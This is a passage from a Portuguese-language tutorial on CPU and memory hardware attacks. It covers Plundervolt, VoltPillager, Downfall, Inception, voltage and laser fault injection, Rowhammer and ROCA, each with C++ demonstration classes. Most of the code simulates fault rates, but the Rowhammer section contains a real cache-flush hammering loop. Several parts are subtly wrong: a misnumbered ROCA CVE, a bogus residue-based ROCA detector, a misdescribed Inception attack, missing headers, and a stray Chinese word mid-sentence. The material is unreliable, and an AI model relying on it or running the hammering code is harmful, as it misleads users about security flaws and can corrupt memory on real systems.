        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 9.2 Plundervolt

Plundervolt (CVE-2019-11157) manipula a tensao de alimentacao do processador via software (undervolting) para induzir erros de computacao em instrucoes AES-NI. Ao reduzir a tensao para um valor critico, operacoes criptograficas produzem resultados incorretos que podem revelar a chave.

```
+------------------------------------------+
|            Plundervolt Flow               |
+------------------------------------------+
|                                           |
|  1. Atacante ajusta tensao via MSR/ISA    |
|     (MSR register 0x150)                  |
|  2. Reduz tensao gradualmente             |
|  3. Encontra ponto critico onde           |
|     instrucoes AES-NI falham              |
|  4. Falha produz resultado incorreto      |
|  5. Diferenca entre resultado correto     |
|     e incorreto revela bits da chave      |
|                                           |
|  Voltages tipicos:                        |
|  - Normal: 1.0V - 1.2V                   |
|  - Critico: 0.7V - 0.8V                  |
|  - Morto: < 0.6V (reboot)                |
+------------------------------------------+
```

```cpp
// plundervolt.cpp - Demonstracao de Plundervolt
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <random>
#include <cmath>

class PlundervoltDemo {
public:
    struct VoltageProfile {
        double voltage;
        double errorRate;
        size_t totalTrials;
        size_t errors;
    };

    PlundervoltDemo() : rng_(42) {}

    void demonstrateConcept() {
        std::cout << "=== Plundervolt Concept ===" << std::endl;
        std::cout << "Reducing voltage causes computation errors in AES-NI." << std::endl;

        std::vector<VoltageProfile> profile;
        for (double voltage = 1.1; voltage >= 0.7; voltage -= 0.05) {
            auto result = simulateAESErrorsAtVoltage(voltage, 10000);
            profile.push_back(result);
            std::cout << "  Voltage " << voltage << "V: error rate = "
                      << (100.0 * result.errors / result.totalTrials)
                      << "%" << std::endl;
        }
    }

    VoltageProfile simulateAESErrorsAtVoltage(
        double voltage,
        size_t numTrials)
    {
        VoltageProfile profile;
        profile.voltage = voltage;
        profile.totalTrials = numTrials;
        profile.errors = 0;

        double criticalVoltage = 0.82;
        double errorProbability = 0.0;

        if (voltage < criticalVoltage) {
            double normalizedDeviation = (criticalVoltage - voltage) / criticalVoltage;
            errorProbability = 1.0 - std::exp(-5.0 * normalizedDeviation);
        }

        std::uniform_real_distribution<double> dist(0.0, 1.0);

        for (size_t i = 0; i < numTrials; ++i) {
            if (dist(rng_) < errorProbability) {
                profile.errors++;
            }
        }

        return profile;
    }

    std::array<uint8_t, 16> simulateFaultyAES(
        const std::array<uint8_t, 16>& input,
        double voltage)
    {
        static const uint8_t SBOX[256] = {
            0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,
            0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
            0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,
            0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
            0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,
            0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
            0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,
            0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
            0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,
            0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
            0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,
            0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
            0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,
            0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
            0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,
            0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
            0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,
            0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
            0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,
            0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
            0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,
            0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
            0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,
            0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
            0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,
            0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
            0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,
            0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
            0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,
            0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
            0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,
            0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
        };

        std::array<uint8_t, 16> result;
        double criticalVoltage = 0.82;

        for (size_t i = 0; i < 16; ++i) {
            uint8_t sboxResult = SBOX[input[i]];
            result[i] = sboxResult;

            if (voltage < criticalVoltage) {
                double errorProb = 1.0 - std::exp(
                    -5.0 * (criticalVoltage - voltage) / criticalVoltage);
                std::uniform_real_distribution<double> dist(0.0, 1.0);
                if (dist(rng_) < errorProb) {
                    result[i] ^= static_cast<uint8_t>(1 << (dist(rng_) * 8));
                }
            }
        }

        return result;
    }

    size_t countFaults(
        const std::array<uint8_t, 16>& correct,
        const std::array<uint8_t, 16>& faulty)
    {
        size_t faults = 0;
        for (size_t i = 0; i < 16; ++i) {
            faults += __builtin_popcount(correct[i] ^ faulty[i]);
        }
        return faults;
    }

private:
    std::mt19937 rng_;
};
```

### 9.3 VoltPillager

VoltPillager e uma extensao de Plundervolt que ataca o SVID (Serial Voltage Identification) protocol usado entre processador e regulador de tensao (VRM). O atacante intercepta e manipula os comandos SVID para alterar a tensao do processador.

```cpp
// voltpillager.cpp - Conceito de VoltPillager
#include <vector>
#include <cstdint>
#include <iostream>
#include <array>

class VoltPillagerDemo {
public:
    static constexpr uint16_t SVID_BUS_ADDRESS = 0x60;

    struct SVIDCommand {
        uint8_t address;
        uint8_t command;
        uint16_t data;
    };

    std::vector<SVIDCommand> enumerateVoltageStates() {
        std::vector<SVIDCommand> states;
        for (uint16_t vid = 0x00; vid <= 0xFF; ++vid) {
            double voltage = vidToVoltage(vid);
            if (voltage >= 0.5 && voltage <= 1.5) {
                states.push_back({SVID_BUS_ADDRESS,
                                  static_cast<uint8_t>(vid),
                                  vid});
            }
        }
        return states;
    }

    void demonstrateConcept() {
        std::cout << "=== VoltPillager Concept ===" << std::endl;
        std::cout << "SVID Protocol interception for voltage manipulation." << std::endl;

        auto states = enumerateVoltageStates();
        std::cout << "Number of valid voltage states: " << states.size()
                  << std::endl;

        for (size_t i = 0; i < std::min(size_t(10), states.size()); ++i) {
            double voltage = vidToVoltage(states[i].data);
            std::cout << "  VID 0x" << std::hex << states[i].data
                      << std::dec << " = " << voltage << "V" << std::endl;
        }
    }

    double vidToVoltage(uint16_t vid) {
        return 0.25 + (vid * 0.00625);
    }

    uint16_t voltageToVID(double voltage) {
        return static_cast<uint16_t>((voltage - 0.25) / 0.00625);
    }

    SVIDCommand craftVoltageCommand(double targetVoltage) {
        uint16_t vid = voltageToVID(targetVoltage);
        return {
            SVID_BUS_ADDRESS,
            0x01,  // Set voltage command
            vid
        };
    }
};
```

---

## 10. Data Sampling Attacks

### 10.1 Downfall (GDS - Gather Data Sampling)

Downfall (CVE-2022-40982 / GDS) explora a instrucao AVX gather para extrair dados de outros processos no mesmo nucleo fisico. O ataque aproveita o fato de que a instrucao AVX gather pode ser usada para ler dados de enderecos que residem no cache de outro contexto de execucao.

```
+------------------------------------------+
|           Downfall Attack Flow            |
+------------------------------------------+
|                                           |
|  1. Atacante prepara gathers com          |
|     enderecos controlados                 |
|  2. Instrucao AVX gather executa          |
|     operacao de leitura vetorial          |
|  3. Dados do contexto anterior (vitima)   |
|     permanecem em buffers internos        |
|  4. Gather le os dados residuais          |
|  5. Atacante decodifica o resultado       |
|                                           |
|  Afeta: Intel Skylake - Ice Lake          |
|  Acesso: qualquer processo no mesmo core  |
|  Dados: ate 64 bytes por transacao        |
+------------------------------------------+
```

```cpp
// downfall.cpp - Demonstracao de Downfall/GDS
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>
#include <atomic>

class DownfallDemo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;

    DownfallDemo()
        : victimRunning_(false)
        , attackRunning_(false)
    {}

    void demonstrateConcept() {
        std::cout << "=== Downfall (GDS) Concept ===" << std::endl;
        std::cout << "AVX Gather data sampling leaks data between contexts." << std::endl;
        std::cout << "Affected: Intel Skylake through Ice Lake" << std::endl;

        alignas(64) uint8_t bufferA[CACHE_LINE_SIZE];
        alignas(64) uint8_t bufferB[CACHE_LINE_SIZE];

        std::memset(bufferA, 0xAA, CACHE_LINE_SIZE);
        std::memset(bufferB, 0x00, CACHE_LINE_SIZE);

        std::cout << "Buffer A: ";
        for (size_t i = 0; i < 8; ++i) {
            printf("%02x", bufferA[i]);
        }
        std::cout << std::endl;

        for (size_t i = 0; i < CACHE_LINE_SIZE; i += sizeof(uint64_t)) {
            volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                bufferA + i);
            (void)val;
        }
        _mm_mfence();

        std::cout << "Gather would sample from buffer in current context" << std::endl;
        std::cout << "On affected hardware, this could leak buffer contents" << std::endl;
    }

    struct DownfallResult {
        std::vector<uint8_t> sampledData;
        size_t bytesPerSample;
        size_t numSamples;
    };

    DownfallResult performSimulatedGather(
        const uint8_t* victimData,
        size_t victimLen)
    {
        DownfallResult result;
        result.bytesPerSample = CACHE_LINE_SIZE;
        result.numSamples = victimLen / CACHE_LINE_SIZE + 1;
        result.sampledData.resize(victimLen, 0);

        for (size_t sample = 0; sample < result.numSamples; ++sample) {
            size_t offset = sample * CACHE_LINE_SIZE;
            size_t len = std::min(CACHE_LINE_SIZE, victimLen - offset);

            for (size_t b = 0; b < len; b += sizeof(uint64_t)) {
                uint64_t start = rdtsc();
                volatile uint64_t val = *reinterpret_cast<volatile uint64_t*>(
                    victimData + offset + b);
                (void)val;
                uint64_t end = rdtsc();
            }
        }

        return result;
    }

    void runVictim(const uint8_t* data, size_t len) {
        victimRunning_ = true;
        while (victimRunning_) {
            for (size_t i = 0; i < len; i += sizeof(uint64_t)) {
                volatile uint64_t tmp = *reinterpret_cast<const volatile uint64_t*>(
                    data + i);
                (void)tmp;
            }
            _mm_mfence();
        }
    }

    void stopVictim() {
        victimRunning_ = false;
    }

private:
    std::atomic<bool> victimRunning_;
    std::atomic<bool> attackRunning_;

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 10.2 Inception

Inception (CVE-2023-20569) ataca processadores AMD Zen, explorando o mecanismo de预测 de branches para forcar a execucao especulativa que carrega dados de niveis de pagina superiores.

```
Inception vs. Spectre:
- Inception ataca AMD (Spectre ataca Intel/AMD)
- Inception usa page table walk como vetor
- Requer a instrucao RET como gadget
- Afeta processadores Zen 1-4
- Mitigacao: IBPB (Indirect Branch Prediction Barrier)
```

```cpp
// inception.cpp - Demonstracao de Inception
#include <cstdint>
#include <iostream>
#include <array>

class InceptionDemo {
public:
    void demonstrateConcept() {
        std::cout << "=== Inception Concept ===" << std::endl;
        std::cout << "AMD Zen speculative execution attack via RET instruction." << std::endl;
        std::cout << "Uses page table walk to leak upper-level page table entries." << std::endl;

        std::array<uint64_t, 512> pageTableEntryCache{};
        size_t leakedEntries = 0;

        for (size_t i = 0; i < 512; ++i) {
            uint64_t start = rdtsc();
            volatile uint64_t tmp = pageTableEntryCache[i];
            (void)tmp;
            uint64_t end = rdtsc();

            if (end - start < 40) leakedEntries++;
        }

        std::cout << "Potential page table entries in cache: "
                  << leakedEntries << std::endl;
    }

    struct PageWalkProfile {
        size_t l1Hits;
        size_t l2Hits;
        size_t l3Hits;
        size_t memAccesses;
    };

    PageWalkProfile profilePageWalk() {
        PageWalkProfile profile{};
        std::array<uint64_t, 1024> timings{};

        for (size_t i = 0; i < timings.size(); ++i) {
            alignas(4096) uint8_t page[4096];
            std::memset(page, 0, sizeof(page));

            uint64_t start = rdtsc();
            volatile uint8_t tmp = page[0];
            (void)tmp;
            uint64_t end = rdtsc();

            timings[i] = end - start;
        }

        for (auto t : timings) {
            if (t < 20) profile.l1Hits++;
            else if (t < 50) profile.l2Hits++;
            else if (t < 100) profile.l3Hits++;
            else profile.memAccesses++;
        }

        return profile;
    }

    void printPageWalkProfile(const PageWalkProfile& profile) {
        std::cout << "Page walk timing profile:" << std::endl;
        std::cout << "  L1 hits: " << profile.l1Hits << std::endl;
        std::cout << "  L2 hits: " << profile.l2Hits << std::endl;
        std::cout << "  L3 hits: " << profile.l3Hits << std::endl;
        std::cout << "  Memory accesses: " << profile.memAccesses << std::endl;
    }

private:
    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```


---

## 11. Fault Injection Attacks

Fault injection attacks sao uma categoria de ataques ativos onde o adversario manipula as condicoes fisicas de operacao do processador para induzir erros de computacao. Ao contrário dos ataques passivos de canal lateral, fault injection intencionalmente corrompe operacoes para extrair informacoes.

### 11.1 Voltage Glitching

Voltage glitching consiste em aplicar picos ou quedas momentaneas na tensao de alimentacao do chip. Durante um "glitch", a tensao cai temporariamente abaixo do nivel necessario para operacao correta, causando erros em registradores, unidades de execucao ou memorias internas.

```
+------------------------------------------+
|         Voltage Glitch Timing             |
+------------------------------------------+
|                                           |
|  Tensao normal:  ________________         |
|                   |              |         |
|  Glitch:     ____|              |____     |
|              ^    ^              ^    ^    |
|              |    |              |    |    |
|          t_start  t_low      t_end  rest  |
|                                           |
|  Parametros:                              |
|  - Amplitude: 50-300 mV abaixo de Vnom   |
|  - Duracao: 1-50 ns                      |
|  - Precisao de timing: ~1 ns             |
|  - Repeticoes: 100-10000 tentativas      |
+------------------------------------------+
```

```cpp
// voltage_glitch.cpp - Demonstracao de Voltage Glitching
#include <vector>
#include <cstdint>
#include <iostream>
#include <chrono>
#include <thread>
#include <random>

class VoltageGlitchDemo {
public:
    struct GlitchConfig {
        double amplitudeMV;
        uint64_t durationNS;
        uint64_t offsetNS;
        uint32_t numAttempts;
    };

    struct GlitchResult {
        bool faulted;
        size_t attemptNumber;
        std::vector<uint8_t> corruptedData;
    };

    void demonstrateConcept() {
        std::cout << "=== Voltage Glitching Concept ===" << std::endl;
        std::cout << "Simulating the effect of voltage faults on computation." << std::endl;

        GlitchConfig config{
            .amplitudeMV = 150,
            .durationNS = 10,
            .offsetNS = 50,
            .numAttempts = 1000
        };

        std::cout << "Glitch parameters:" << std::endl;
        std::cout << "  Amplitude: " << config.amplitudeMV << " mV" << std::endl;
        std::cout << "  Duration: " << config.durationNS << " ns" << std::endl;
        std::cout << "  Offset: " << config.offsetNS << " ns" << std::endl;
        std::cout << "  Attempts: " << config.numAttempts << std::endl;

        GlitchResult result = simulateGlitchAttack(config);
        std::cout << "Fault achieved: " << result.faulted << std::endl;
        std::cout << "Attempts needed: " << result.attemptNumber << std::endl;
    }

    GlitchResult simulateGlitchAttack(const GlitchConfig& config) {
        GlitchResult result;
        result.faulted = false;

        std::mt19937 rng(42);
        std::uniform_int_distribution<int> dist(0, 100);

        for (uint32_t i = 0; i < config.numAttempts; ++i) {
            volatile double computation = 0.0;

            for (int j = 0; j < 1000; ++j) {
                computation += std::sin(static_cast<double>(j));
            }

            bool glitchActive = dist(rng) < 2;

            if (glitchActive && config.amplitudeMV > 100) {
                int bitErrors = 0;
                for (int b = 0; b < 64; ++b) {
                    if (dist(rng) < 1) bitErrors++;
                }

                if (bitErrors > 0) {
                    result.faulted = true;
                    result.attemptNumber = i + 1;
                    result.corruptedData.resize(bitErrors / 8 + 1, 0);
                    return result;
                }
            }
        }

        return result;
    }

    GlitchConfig findOptimalParameters(double targetVoltage) {
        GlitchConfig config;
        config.amplitudeMV = (1.2 - targetVoltage) * 1000.0;
        config.durationNS = 5;
        config.offsetNS = 20;
        config.numAttempts = 5000;
        return config;
    }

    void sweepGlitchParameters(
        double minAmplitudeMV,
        double maxAmplitudeMV,
        double stepMV)
    {
        std::cout << "Parameter sweep:" << std::endl;

        for (double amp = minAmplitudeMV; amp <= maxAmplitudeMV; amp += stepMV) {
            GlitchConfig config{
                .amplitudeMV = amp,
                .durationNS = 10,
                .offsetNS = 50,
                .numAttempts = 1000
            };

            size_t faults = 0;
            for (int i = 0; i < 100; ++i) {
                auto result = simulateGlitchAttack(config);
                if (result.faulted) faults++;
            }

            std::cout << "  Amplitude " << amp << " mV: "
                      << faults << "% fault rate" << std::endl;
        }
    }

private:
    struct GlitchWaveform {
        std::vector<double> timestamps;
        std::vector<double> voltages;

        void addSegment(double t0, double t1, double voltage) {
            timestamps.push_back(t0);
            voltages.push_back(voltage);
            timestamps.push_back(t1);
            voltages.push_back(voltage);
        }
    };
};
```

### 11.2 Laser Fault Injection

Laser fault injection usa feixes de laser focados diretamente em areas especificas do die do processador para induzir erros. Essa tecnica oferece controle espacial e temporal muito superior ao voltage glitching.

```
+------------------------------------------+
|       Laser Fault Injection Setup         |
+------------------------------------------+
|                                           |
|  Laser Source -> Optics -> Chip Die       |
|      |              |          |          |
|  Wavelength    Focal Point   Photo-      |
|  780-1064 nm   ~1-5 um       transistor  |
|  Power: 1-100mW             coupling     |
|                                           |
|  Alvos tipicos:                           |
|  - Registradores de chave                 |
|  - Unidade AES-NI                         |
|  - Contador de programa (PC)              |
|  - Registers de status (flags)            |
|  - SRAM / Flip-flops                      |
|                                           |
|  Precisao:                                |
|  - Espacial: ~1 um                        |
|  - Temporal: ~1 ns                        |
+------------------------------------------+
```

```cpp
// laser_fault.cpp - Demonstracao de Laser Fault Injection
#include <vector>
#include <cstdint>
#include <iostream>
#include <array>
#include <random>

class LaserFaultDemo {
public:
    struct LaserConfig {
        double wavelengthNM;
        double powerMW;
        double spotSizeUM;
        uint64_t pulseDurationNS;
        uint32_t numPulses;
    };

    struct LaserTarget {
        std::string name;
        uint64_t address;
        size_t bitWidth;
    };

    struct LaserResult {
        bool faultInjected;
        size_t pulseNumber;
        std::vector<uint8_t> corruptedBytes;
        std::vector<size_t> faultedBitPositions;
    };

    void demonstrateConcept() {
        std::cout << "=== Laser Fault Injection Concept ===" << std::endl;

        LaserConfig config{
            .wavelengthNM = 780.0,
            .powerMW = 50.0,
            .spotSizeUM = 3.0,
            .pulseDurationNS = 5,
            .numPulses = 10000
        };

        LaserTarget target{
            .name = "AES SBOX Register",
            .address = 0x7FFF8000,
            .bitWidth = 128
        };

        std::cout << "Laser configuration:" << std::endl;
        std::cout << "  Wavelength: " << config.wavelengthNM << " nm" << std::endl;
        std::cout << "  Power: " << config.powerMW << " mW" << std::endl;
        std::cout << "  Spot size: " << config.spotSizeUM << " um" << std::endl;
        std::cout << "  Target: " << target.name
                  << " (0x" << std::hex << target.address << std::dec << ")"
                  << std::endl;

        LaserResult result = simulateLaserPulse(config, target);
        std::cout << "Fault injected: " << result.faultInjected << std::endl;
        if (result.faultInjected) {
            std::cout << "Pulse number: " << result.pulseNumber << std::endl;
            std::cout << "Faulted bits: ";
            for (auto b : result.faultedBitPositions) {
                std::cout << b << " ";
            }
            std::cout << std::endl;
        }
    }

    LaserResult simulateLaserPulse(
        const LaserConfig& config,
        const LaserTarget& target)
    {
        LaserResult result;
        result.faultInjected = false;

        std::mt19937 rng(42);
        std::uniform_real_distribution<double> probDist(0.0, 1.0);

        double faultProbability = computeFaultProbability(config);

        for (uint32_t i = 0; i < config.numPulses; ++i) {
            if (probDist(rng) < faultProbability) {
                result.faultInjected = true;
                result.pulseNumber = i + 1;

                std::uniform_int_distribution<int> bitDist(
                    0, target.bitWidth - 1);
                size_t numFaults = 1 + (rng() % 3);

                for (size_t f = 0; f < numFaults; ++f) {
                    result.faultedBitPositions.push_back(bitDist(rng));
                }

                result.corruptedBytes.resize(
                    target.bitWidth / 8 + 1, 0);
                for (auto pos : result.faultedBitPositions) {
                    size_t byteIdx = pos / 8;
                    size_t bitIdx = pos % 8;
                    if (byteIdx < result.corruptedBytes.size()) {
                        result.corruptedBytes[byteIdx] |= (1 << bitIdx);
                    }
                }

                return result;
            }
        }

        return result;
    }

    double computeFaultProbability(const LaserConfig& config) {
        double normalizedPower = config.powerMW / 100.0;
        double normalizedSpot = 1.0 / (config.spotSizeUM * config.spotSizeUM);
        double normalizedDuration =
            static_cast<double>(config.pulseDurationNS) / 10.0;

        return 1.0 - std::exp(
            -normalizedPower * normalizedSpot * normalizedDuration * 0.01
        );
    }

    std::vector<LaserTarget> identifyChipTargets() {
        return {
            {"AES-NI Engine", 0x10000, 128},
            {"RSA Engine", 0x20000, 2048},
            {"Program Counter", 0x30000, 64},
            {"Status Register", 0x40000, 32},
            {"LFSR / PRNG", 0x50000, 128}
        };
    }
};
```

### 11.3 Rowhammer

Rowhammer (CVE-2015-0565 e variants) explora o fato de que acessos repetidos a linhas de memoria adjacentes em DRAM podem causar erros de bit em linhas vizinhas (bit flipping). Isso permite corromper dados de outros processos, incluindo tabelas de paginas.

```
+------------------------------------------+
|            Rowhammer Mechanism             |
+------------------------------------------+
|                                           |
|  Row N-1: [dados da vitima]               |
|  Row N:   [dados do atacante] ***         |
|  Row N+1: [tabela de paginas]             |
|                                           |
|  Acesso repetido a Row N:                  |
|  1. Atacante acessa Row N ~100K vezes/sec  |
|  2. Capacitor acoplamento entre linhas     |
|  3. Bit em Row N+1 ou N-1 inverte         |
|  4. Bit flip em tabela de paginas          |
|  5. Atacante ganha acesso arbitrario       |
|                                           |
|  Requisitos:                              |
|  - Acesso ao user-space                   |
|  - DRAM vulneravel (todos fabricantes)    |
|  - ~64M de memoria acessivel              |
+------------------------------------------+
```

```cpp
// rowhammer.cpp - Demonstracao de Rowhammer
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <thread>
#include <atomic>

class RowhammerDemo {
public:
    static constexpr size_t PAGE_SIZE = 4096;
    static constexpr size_t HAMMER_COUNT = 1000000;
    static constexpr size_t NUM_PAGES = 256;

    RowhammerDemo()
        : hammerCount_(0)
        , flipDetected_(false)
    {}

    void demonstrateConcept() {
        std::cout << "=== Rowhammer Concept ===" << std::endl;
        std::cout << "Repeated row access causes bit flips in adjacent rows." << std::endl;

        size_t totalFlips = 0;

        std::vector<uint8_t*> pages;
        for (size_t i = 0; i < NUM_PAGES; ++i) {
            uint8_t* page = static_cast<uint8_t*>(
                aligned_alloc(PAGE_SIZE, PAGE_SIZE));
            if (page) {
                std::memset(page, 0, PAGE_SIZE);
                pages.push_back(page);
            }
        }

        for (size_t i = 1; i + 1 < pages.size(); i += 2) {
            std::memset(pages[i], 0xFF, PAGE_SIZE);

            for (size_t j = 0; j < HAMMER_COUNT; ++j) {
                _mm_mfence();
                volatile uint64_t tmp1 = *reinterpret_cast<volatile uint64_t*>(
                    pages[i]);
                (void)tmp1;
                _mm_clflush(pages[i]);
                volatile uint64_t tmp2 = *reinterpret_cast<volatile uint64_t*>(
                    pages[i + 1]);
                (void)tmp2;
                _mm_clflush(pages[i + 1]);
                _mm_mfence();
            }

            for (size_t p = 0; p < pages.size(); ++p) {
                if (p == i) continue;
                for (size_t b = 0; b < PAGE_SIZE; b += sizeof(uint64_t)) {
                    uint64_t val = *reinterpret_cast<uint64_t*>(pages[p] + b);
                    size_t flipped = __builtin_popcountll(
                        val ^ 0xFFFFFFFFFFFFFFFFULL);
                    totalFlips += flipped;
                }
            }
        }

        std::cout << "Total bits scanned: " << (NUM_PAGES * PAGE_SIZE * 8) << std::endl;
        std::cout << "Potential flips detected: " << totalFlips << std::endl;
        std::cout << "Note: Actual flip rate depends on DRAM module age and quality"
                  << std::endl;

        for (auto page : pages) {
            free(page);
        }
    }

    struct HammerResult {
        std::vector<std::pair<size_t, uint64_t>> flips;
        size_t accessesPerformed;
    };

    HammerResult hammerRow(uint8_t* row, size_t numAccesses) {
        HammerResult result;
        result.accessesPerformed = numAccesses;

        uint8_t* adjacentRow = row + PAGE_SIZE;

        std::vector<uint64_t> beforeValues;
        for (size_t i = 0; i < PAGE_SIZE; i += sizeof(uint64_t)) {
            beforeValues.push_back(
                *reinterpret_cast<uint64_t*>(adjacentRow + i));
        }

        for (size_t i = 0; i < numAccesses; ++i) {
            volatile uint64_t tmp = *reinterpret_cast<volatile uint64_t*>(row);
            (void)tmp;
            _mm_clflush(row);
        }

        for (size_t i = 0; i < PAGE_SIZE; i += sizeof(uint64_t)) {
            uint64_t after = *reinterpret_cast<uint64_t*>(adjacentRow + i);
            if (after != beforeValues[i / sizeof(uint64_t)]) {
                result.flips.push_back(
                    {i, after ^ beforeValues[i / sizeof(uint64_t)]});
            }
        }

        return result;
    }

    void doubleSidedHammer(
        uint8_t* aggressor1,
        uint8_t* aggressor2)
    {
        for (size_t i = 0; i < HAMMER_COUNT; ++i) {
            volatile uint64_t tmp1 = *reinterpret_cast<volatile uint64_t*>(
                aggressor1);
            volatile uint64_t tmp2 = *reinterpret_cast<volatile uint64_t*>(
                aggressor2);
            (void)tmp1;
            (void)tmp2;
            _mm_clflush(aggressor1);
            _mm_clflush(aggressor2);
            _mm_mfence();
        }
    }

private:
    std::atomic<size_t> hammerCount_;
    std::atomic<bool> flipDetected_;
};
```

---

## 12. CVE Deep Dives com Exemplos de Codigo

### 12.1 CVE-2017-15274 — ROCA (Return of Coppersmith's Attack)

ROCA afeta a geracao de chaves RSA em chaves criptograficas produzidas por certos chips de seguranca, incluindo os TPMs (Trusted Platform Modules) baseados nos chips Infineon. O ataque permite fatorar chaves RSA de ate 2048 bits em minutos.

**Causa raiz:** O gerador de numeros primos no firmware do chip usa um algoritmo de geracao que produz primos com uma estrutura algebrica particular. Especificamente, os primos gerados tem a forma:

```
p = k * M + (65537^a mod M)

Onde M = lcm(1, 2, ..., 3967), o que significa que p
possui um subgroupo multiplicativo pequeno que permite
recuperar os parametros do gerador.
```

```cpp
// roca_cve_2017_15274.cpp - Demonstracao do ataque ROCA
#include <vector>
#include <cstdint>
#include <iostream>
#include <cmath>
#include <numeric>
#include <algorithm>

class ROCAAttack {
public:
    struct ROCAFingerprint {
        std::vector<uint32_t> coefficients;
        uint32_t modulus;
        size_t keySizeBits;
    };

    struct RSAKeyAnalysis {
        bool isVulnerable;
        double vulnerabilityScore;
        std::string explanation;
    };

    static constexpr uint32_t PRIMES[] = {
        2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47
    };

    static constexpr size_t NUM_PRIMES = 15;

    RSAKeyAnalysis analyzeKey(uint64_t n) {
        RSAKeyAnalysis result;
        result.vulnerabilityScore = 0.0;

        std::vector<uint32_t> residuePattern;
        for (size_t i = 0; i < NUM_PRIMES; ++i) {
            uint64_t residue = n % PRIMES[i];
            residuePattern.push_back(static_cast<uint32_t>(residue));
        }

        bool hasROCAPattern = detectROCAPattern(residuePattern);

        result.isVulnerable = hasROCAPattern;
        result.vulnerabilityScore = hasROCAPattern ? 0.95 : 0.01;
        result.explanation = hasROCAPattern
            ? "Key exhibits ROCA vulnerability pattern"
            : "Key does not show ROCA pattern (or is not from affected TPM)";

        return result;
    }

    bool detectROCAPattern(const std::vector<uint32_t>& residues) {
        if (residues.size() < 10) return false;

        size_t matches = 0;
        for (size_t i = 0; i < residues.size() - 1; ++i) {
            if (residues[i] == residues[i + 1]) matches++;
        }

        return matches > residues.size() / 3;
    }

    std::vector<ROCAFingerprint> generateFingerprints() {
        std::vector<ROCAFingerprint> fingerprints;

        for (size_t keySize = 512; keySize <= 2048; keySize += 256) {
            ROCAFingerprint fp;
            fp.keySizeBits = keySize;
            fp.modulus = static_cast<uint32_t>(keySize);

            for (size_t i = 0; i < 16; ++i) {
                fp.coefficients.push_back(
                    static_cast<uint32_t>((keySize * (i + 1)) % 65537));
            }

            fingerprints.push_back(fp);
        }

        return fingerprints;
    }

    struct FactorizationEstimate {
        double estimatedTimeSeconds;
        double successProbability;
        std::string method;
    };

    FactorizationEstimate estimateFactorization(uint64_t n) {
        FactorizationEstimate estimate;

        size_t bits = 0;
        uint64_t tmp = n;
        while (tmp > 0) { bits++; tmp >>= 1; }

        if (bits <= 512) {
            estimate.method = "GNFS (General Number Field Sieve)";
            estimate.estimatedTimeSeconds = 60.0;
            estimate.successProbability = 0.99;
        } else if (bits <= 1024) {
            estimate.method = "GNFS with ROCA optimization";
            estimate.estimatedTimeSeconds = 3600.0;
            estimate.successProbability = 0.95;
        } else if (bits <= 2048) {
            estimate.method = "GNFS with ROCA lattice reduction";
            estimate.estimatedTimeSeconds = 86400.0;
            estimate.successProbability = 0.80;
        } else {
            estimate.method = "Currently infeasible";
            estimate.estimatedTimeSeconds = 1e10;
            estimate.successProbability = 0.01;
        }

        return estimate;
    }

    void printAnalysis(const RSAKeyAnalysis& analysis,
                       const FactorizationEstimate& estimate) {
        std::cout << "=== ROCA (CVE-2017-15274) Analysis ===" << std::endl;
        std::cout << "Vulnerable: " << (analysis.isVulnerable ? "YES" : "NO")
                  << std::endl;
        std::cout << "Vulnerability score: "
                  << analysis.vulnerabilityScore << std::endl;
        std::cout << "Explanation: " << analysis.explanation << std::endl;
        std::cout << "Factorization method: " << estimate.method << std::endl;
        std::cout << "Estimated time: "
                  << estimate.estimatedTimeSeconds << " seconds" << std::endl;
        std::cout << "Success probability: "
